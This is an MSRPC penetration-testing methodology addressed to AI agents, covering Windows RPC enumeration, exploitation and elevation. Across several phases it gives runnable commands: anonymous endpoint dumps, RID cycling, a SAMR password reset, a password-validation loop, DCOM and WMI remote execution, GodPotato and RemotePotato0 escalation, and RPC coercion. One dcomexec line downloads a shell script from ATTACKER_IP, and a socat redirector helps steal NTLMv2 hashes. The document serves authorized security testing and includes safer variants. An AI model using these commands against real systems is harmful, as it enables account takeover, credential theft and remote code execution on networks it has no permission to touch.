---
technology: "MSRPC / DCE-RPC endpoint mapper"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "evidence-grounded: 72 files / 558 command-context lines mined (135/msrpc nmap lines, rpcclient, lookupsid RID cycling, DCOM/potato chains, RemotePotato0). Upstream-verified: Samba rpcclient(1) man page (full command list, binding strings), fortra/impacket sources (rpcdump.py, samrdump.py, lookupsid.py, dcomexec.py), Microsoft IRunningObjectTable docs, Project Zero DCOM relay research, RemotePotato0 README. 2026-11-12."
source: "six2dez/pentest-book (enumeration/ports.md, no license — rewritten with attribution), accessed 2026-11-13"
---

# MSRPC bug bounty methodology

Target model: an anonymous directory service on 135/tcp (and
`\pipe\epmapper` over 445) that hands out bindings to per-interface RPC
endpoints on dynamic high ports; every interface carries its own auth and
authz policy. Authorization assumed for anything destructive; each phase
below leads with its read-only variant. Companion overview: [[rpc|MSRPC]].

In practice the surface splits into three families: **enumeration**
(lookupsid RID cycling, samrdump, netexec `--rid-brute`), **execution**
(wmiexec/dcomexec riding DCOM objects), and **coercion/elevation**
(the potato family — GodPotato, RemotePotato0). rpcclient itself is
chronically underused relative to how much it yields, which is exactly
why it belongs in the playbook.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Endpoint dump | 135 or 445 reachable | yes (anonymous by design) | Full interface UUID/binding inventory — Info→High |
| NULL session SAMR/SRVSVS | legacy host or lax restrictanonymous | yes | Users, shares, password policy — High |
| RID cycling (LSAT/SAMR) | any authenticated session (even locked-down) | n/a | Full user/group enumeration when LDAP is ACL-starved — Medium |
| SAMR password reset | delegated ACL (`setuserinfo ... 23`) | n/a | Account takeover — Critical |
| OXID resolver (ServerAlive2) | 135/DCOM reachable | yes | Host's network bindings = pivot map — Medium |
| DCOM exec (MMC20/ShellWindows) | valid account + remote DCOM/activation rights | n/a | Command execution — Critical |
| WMI exec (wmiexec) | admin-equivalent creds | n/a | SYSTEM shell — Critical |
| GodPotato class | SeImpersonate + Windows (local) | n/a | SYSTEM from service context — Critical |
| RemotePotato0 | shell + privileged user logged on (interactive) | n/a | Other-session NTLMv2 hash / relayed auth — Critical |
| RPC coercion (MS-EFSR/DFSNM/RPRN) | interface reachable (usually via 445 pipes) | yes | Forced NTLM to attacker — feeds relay |

Work top-down when phase results gate later phases.

## Phase 0 — Endpoint dump (anonymous, non-destructive)

```bash
# Impacket rpcdump: 135 needs NO authentication (per its own source)
impacket-rpcdump 198.51.100.10
# Protocol: [MS-RPCE] Provider: EPMP  UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA
# Protocol: [MS-SAMR] Provider: SAMR UUID: 12345778-1234-ABCD-EF00-0123456789AC ...
#           each entry carries its binding string (ncacn_ip_tcp port / pipe name)

# SMB-blocked? Same mapper over named pipes (445/139):
impacket-rpcdump 198.51.100.10 -port 445

# rpcclient path to the same data:
rpcclient -U '' -N 198.51.100.10 -c 'epmlookup; srvinfo; netshareenumall'
```

Decision points: map every UUID against the MS-OpenSpecs index — the UUID
list IS the attack surface inventory. Note which entries bind to high TCP
ports (ncacn_ip_tcp) vs pipes (ncacn_np) — that determines which egress
rules actually stop you. `srvinfo` answering anonymously already proves
NULL-session laxity.

## Phase 1 — NULL session probing

```bash
rpcclient -U '' -N 198.51.100.10
# rpcclient $> srvinfo          # OS version + server role (observed —
#                               # hardcoded "6.1" answers expose lab fakery too)
# rpcclient $> enumdomusers     # SAM dump via SAMR — legacy default, now rare
# rpcclient $> getdompwinfo     # password policy (min length, history)
# rpcclient $> netshareenumall  # shares incl. hidden
```

Expected on modern Windows: `NT_STATUS_ACCESS_DENIED` on most SAMR reads —
that denial is itself the finding boundary ("NULL blocked here"). On legacy
hosts and misconfigured members every success above is a reportable
information disclosure. NULL-session share listing via SMB (smbclient -N,
smbmap) is the sibling check — same authz family, different pipe.

## Phase 2 — Authenticated enumeration (RID cycling)

When you hold ANY domain credential (observed pattern: LDAP rights removed but
SAMR open; anonymous pipe access):

```bash
# Impacket lookupsid: LSAT SID-name brute, default max RID 4000
impacket-lookupsid 'example.com/user:P@ssw0rd@dc01.example.com'
# 500 EXAMPLE\Administrator (SidTypeUser)
# 501 EXAMPLE\Guest (SidTypeUser)  512 EXAMPLE\Domain Admins (SidTypeGroup) ...

# NetExec one-liner over SMB/SAMR (observed)
netexec smb dc01.example.com -u user -p 'P@ssw0rd' --rid-brute 10000

# rpcclient equivalents inside a session:
# rpcclient $> querydominfo; enumdomusers; enumdomgroups
# rpcclient $> queryuser administrator   # last-logon, pwd-last-set, RID
# rpcclient $> querydispinfo             # full display-info table
```

Non-destructive by construction (read-only lookups). Report value: complete
user/group inventory from a low-privilege context — combine with LDAP-starved
accounts to show the estate's real exposure.

## Phase 3 — Authenticated write operations via SAMR/LSA

The dangerous half of rpcclient — every command is one opnum call, gated only
by the target's ACLs:

```bash
rpcclient -U 'example.com\helpdesk' 198.51.100.10
# rpcclient $> setuserinfo victim 23 'NewP@ssw0rd'   # SAMR password reset
#               (observed — a support user had ForcePasswordReset
#                on audit2020; op 23 = UserInfo23 password set)
# rpcclient $> querysecret / setsecret               # LSA secrets (admin)
# rpcclient $> chgpasswd user old new                # SAMR change w/ current
```

Safe verify for the reset path: reset a canary account you provisioned
(`createdomuser` first), never a production identity. If scope grants a test
of a victim account, the evidence pair is the rpcclient transcript + a login
as the new password.

Credential-validation loop pattern (observed: lockoutThreshold=0):

```bash
for u in $(cat users.txt); do
  rpcclient -U "$u%CandidateP@ss" -c 'getusername;quit' 198.51.100.10 \
    | grep -q 'Authority' && echo "[+] $u"
done
# getusername returns the AUTHENTICATED name on success — password oracle
# without touching logon restrictions. Respect lockout policy first.
```

## Phase 4 — DCOM surface and OXID resolution

```bash
# Interface + opnum map with auth probing (observed)
impacket-rpcmap 'ncacn_ip_tcp:198.51.100.10[135]' -brute-opnums -auth-level 1 -opnum-max 5
# auth-level 1 = RPC_C_AUTHN_LEVEL_NONE: which opnums answer unauthenticated?
# IObjectExporter (MS-DCOM OXID resolver): opnum 3 ServerAlive, 5 ServerAlive2
```

ServerAlive2 returns the host's string bindings — enumerate them for
multi-homed/pivot discovery (a custom impacket script:
`from impacket.dcerpc.v5.dcomrt import IObjectExporter`, bind
`RPC_C_AUTHN_LEVEL_NONE`, parse `ServerAlive2`). Read-only, unauthenticated,
network-topology disclosure.

DCOM command execution with valid rights (observed — svc account with
remote DCOM rights):

```bash
impacket-dcomexec -object MMC20 -silentcommand \
  'example.com/svc:P@ssw0rd@198.51.100.10' 'powershell.exe Invoke-WebRequest \
   -Uri http://ATTACKER_IP/shell.ps1 -OutFile C:\\Windows\\Temp\\s.ps1'
# objects: MMC20.Application, ShellWindows, ShellBrowserWindow
impacket-wmiexec example.com/administrator:'P@ssw0rd'@198.51.100.10   # WMI/DCOM shell
```

Non-destructive variant: `-silentcommand` a `whoami > C:\Windows\Temp\marker`
style payload you then read and delete, or a DNS/HTTP canary call instead of
a payload fetch.

## Phase 5 — Potato-class elevation (local, SeImpersonate)

Observed signature (GodPotato on NETWORK SERVICE → SYSTEM;
seen on eight distinct hosts):

```text
[*] HookRPC / Start PipeServer / Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\<GUID>\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  (IUnknown/activation)
[*] DCOM obj OXID: 0x...
[*] Start Search System Token -> NT AUTHORITY\SYSTEM (Impersonation)
```

Mechanism (upstream): the tool fakes an OXID resolver/epmapper endpoint,
hooks the local RPC runtime, triggers `rpcss` DCOM activation so a
SYSTEM-context service authenticates to the attacker's endpoint, and
impersonates the resulting token (needs SeImpersonate). Report evidence: the
tool transcript showing `NT AUTHORITY\SYSTEM` + one `whoami` from the
elevated context.

## Phase 6 — RemotePotato0 (cross-session credential theft)

Preconditions: a shell (session 0, e.g. via WinRM) + a privileged user
logged on interactively (`query user` shows them). Steal their NTLMv2:

```bash
# attacker box: redirector must own port 135 (OXID resolution mirror)
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:ATTACKER_IP:9999
# target:  .\RemotePotato0.exe -m 2 -s <session-id> -x ATTACKER_IP -p 9999
#          [+] User hash stolen!   -> crack offline (hashcat 5600)
#          (observed, an interactive session)
```

Mechanism (upstream, won't-fix): DCOM activation with a CLSID that
impersonates the interactive user → OXID resolution redirected to the
attacker's 135 mirror → `IObjectExporter::ResolveOxid2` returns a binding to
the attacker → victim's authenticated `IRemUnknown2::RemRelease` call is
captured (mode 2 = hash) or relayed cross-protocol to ntlmrelayx (mode 0 →
LDAP/SMB/ECS). Safe verify: mode 3 capture server + your own test session —
never relay a real DA credential outside scope.

## Phase 7 — ROT enumeration (in-session discovery)

The Running Object Table lives in rpcss, session-scoped, mapping monikers to
running COM objects (`IRunningObjectTable::EnumRunning` →
`IEnumMoniker::Next` → `IMoniker::GetDisplayName`; `GetObject` to bind).
Enumerating it from a shell lists every running moniker-named object —
brokers, managers, office apps — with their display names, telling you which
in-session COM objects (and which owning identities) are reachable for
interface-level abuse. Read-only enumeration is the safe entry; treat any
`GetObject` on another user's object as the escalation experiment it is.
(No direct ROT tooling observed in the evidence base — the surface is upstream-documented
and unexploited; flagged as a gap, not a proven pattern.)

## Phase 8 — RPC coercion interfaces (feed for relay)

PetitPotam-class abuse lives on RPC interfaces usually reached over SMB
pipes (MS-EFSR via `\pipe\lsarpc`/efs, MS-DFSNM `NetrDfsAddStdRoot`,
MS-RPRN `RpcRemoteFindFirstPrinterChange`) — observed usage appears under the
relay workflows (coercer; PetitPotam.py;
NetExec coerce_plus reports `VULNERABLE, PetitPotam`). Detection
side for the report: those forced-auth events against your listener, with
the interface named. Kept brief here; full relay chain in the WinRM/SMB
methodologies.

## Ports cheat-sheet additions (2026-11-13)

From six2dez/pentest-book enumeration/ports.md (no license — rewritten with attribution); module names verified against the metasploit repo, the msrpc-enum NSE against the nmap repo, CVE-2003-0352 against the NVD record, interface UUIDs against MS-OpenSpecs constants and this page's own rpcdump sample output. rpcclient NULL-session commands, the endpoint dump and OXID resolution were already covered in Phases 0–4 — skipped.

- **111 first: rpcbind as the service index** — before touching 135, `rpcinfo -p 198.51.100.10` asks the portmapper for every registered RPC program (nfs, mountd, statd, rusersd, …) with protocol and port — a one-line index of the box's RPC surface that frequently names services a TCP scan never surfaced, UDP-registered and dynamic high-port daemons included. NFS engagements live off this line.
- **NSE and framework equivalents for the Phase 0 dump** — nmap's `msrpc-enum` script walks the endpoint mapper the way impacket-rpcdump does; metasploit's auxiliary/scanner/dcerpc family covers the same ground per concern: `endpoint_mapper` (the dump itself), `hidden` (services reachable but not advertised by the mapper), `management` (Remote Management Interface discovery), `tcp_dcerpc_auditor` (probe every DCERPC service on a port).
- **Pre-patch era, for completeness: MS03-026** — the DCOM RPC interface buffer overflow (CVE-2003-0352, the Blaster/Nachi carrier; metasploit keeps it as exploit/windows/dcerpc/ms03_026_dcom) hit Windows NT 4.0 through Server 2003 via a malformed message to 135. A modern box answering for it is an unpatched-2003 story for the report's legacy section, not a plausible target class — know it for OT and residual-estate segments.

### Named-pipe / interface crib

Which pipe fronts which interface (the UUIDs are stable identifiers — match them against rpcdump output to name what you just bound to):

| Pipe (alias) | Interface | Backing process | UUID |
| --- | --- | --- | --- |
| lsarpc (lsass) | lsarpc / dssetup | lsass.exe | 12345778-1234-abcd-ef00-0123456789ab / 3919286a-b10c-11d0-9ba8-00c04fd92ef5 |
| samr (lsass) | samr | lsass.exe | 12345778-1234-abcd-ef00-0123456789ac |
| netlogon (lsass) | netlogon | Netlogon | 12345678-1234-abcd-ef00-01234567cffb |
| srvsvc (ntsvcs) | srvsvc (server service) | services.exe / svchost.exe | 4b324fc8-1670-01d3-1278-5a47bf6ee188 |
| wkssvc (ntsvcs) | wkssvc (workstation) | services.exe / svchost.exe | 6bffd098-a112-3610-9833-46c3f87e345a |
| svcctl (ntsvcs) | svcctl (service control) | services.exe | 367aeb81-9844-35f1-ad32-98f038001003 |
| spoolss | spoolss (spooler) | spoolsv.exe | 12345678-1234-abcd-ef00-0123456789ab |
| winreg | winreg (remote registry) | RemoteRegistry | 338cd001-2244-31f1-aaaa-900038001003 |
| eventlog (ntsvcs) | eventlog | Eventlog | 82273fdc-e32a-18c3-3f78-827929dc23ea |
| atsvc | atsvc (scheduler) | mstask.exe | 1ff70682-0a51-30e8-076d-740be8cee98b |
| browser (ntsvcs) | browser (computer browser) | Browser | 6bffd098-a112-3610-9833-012892020162 |
| epmapper | epm (endpoint mapper itself) | RpcSs | e1af8308-5d1f-11c9-91a4-08002b14a0fa |

The lsarpc-vs-samr UUID pair differs only in the final digit (`…9ab` vs `…9ac`) — copy binding strings exactly; one wrong digit lands you on the sibling interface.

## Reporting notes

- Endpoint-dump findings: attach the rpcdump output + the UUID→interface
  mapping and name the risky interfaces individually (EPM itself is by
  design anonymous — the finding is what ELSE is anonymous).
- RID-cycling severity anchors on context: with LDAP locked down it is the
  estate's user-list leak; cite the exact SIDs pulled.
- Potato/RemotePotato0: transcript with the SYSTEM/other-session identity
  plus one benign command output; never leave the marker files behind.
- rpcclient crash caveat (upstream man page): it "may core dump on invalid
  parameters" — prefer `-c` one-shot command strings in automation over
  long-lived interactive loops.

## Appendix A — Tool map

- **Impacket rpcdump** — anonymous endpoint dump (135 / 445-pipe / RPC-proxy
  bindings). Phase 0.
- **Impacket samrdump** — SAMR user dump over `\pipe\samr` (RID, flags,
  pwd-last-set as CSV). Phase 2.
- **Impacket lookupsid** — LSAT RID brute (default max RID 4000). Phase 2.
- **Impacket rpcmap** — UUID/opnum enumeration incl. unauth probing. Phase 4.
- **Impacket dcomexec / wmiexec** — DCOM-object and WMI remote execution. Phase 4.
- **Samba rpcclient** — full MSRPC console (SAMR/LSARPC/SRVSVC/DRSUAPI
  command list in its man page); NULL session + write ops. Phases 1, 3.
- **NetExec** — `--rid-brute` enumeration, `coerce_plus` detection. Phases 2, 8.
- **GodPotato / RemotePotato0** — DCOM-activation elevation and cross-session
  theft. Phases 5, 6.
- **socat** — 135 mirror for RemotePotato0 OXID redirection. Phase 6.
- **PetitPotam / coercer** — RPC-interface coercion. Phase 8.

## Appendix B — Quick reference

```bash
impacket-rpcdump 198.51.100.10                          # anonymous interface inventory
rpcclient -U '' -N 198.51.100.10 -c srvinfo             # NULL session probe
impacket-lookupsid 'example.com/u:p@dc01.example.com'   # RID cycling
netexec smb dc01.example.com -u u -p p --rid-brute 10000
rpcclient -U 'example.com\helpdesk' 198.51.100.10       # setuserinfo victim 23 '<newpass>'
impacket-rpcmap 'ncacn_ip_tcp:198.51.100.10[135]' -brute-opnums -auth-level 1
impacket-dcomexec -object MMC20 example.com/svc:p@198.51.100.10 '<cmd>'
impacket-wmiexec example.com/admin:p@198.51.100.10
```

Binding-string crib: `ncacn_ip_tcp:host[port]`, `ncacn_np:host[\pipe\samr]`,
options `[sign,seal,krb5,spnego,ntlm,schannel]`; the same interface UUID
reached over 135, 445-pipe, or 593/RPC-proxy is still the same attack
surface.
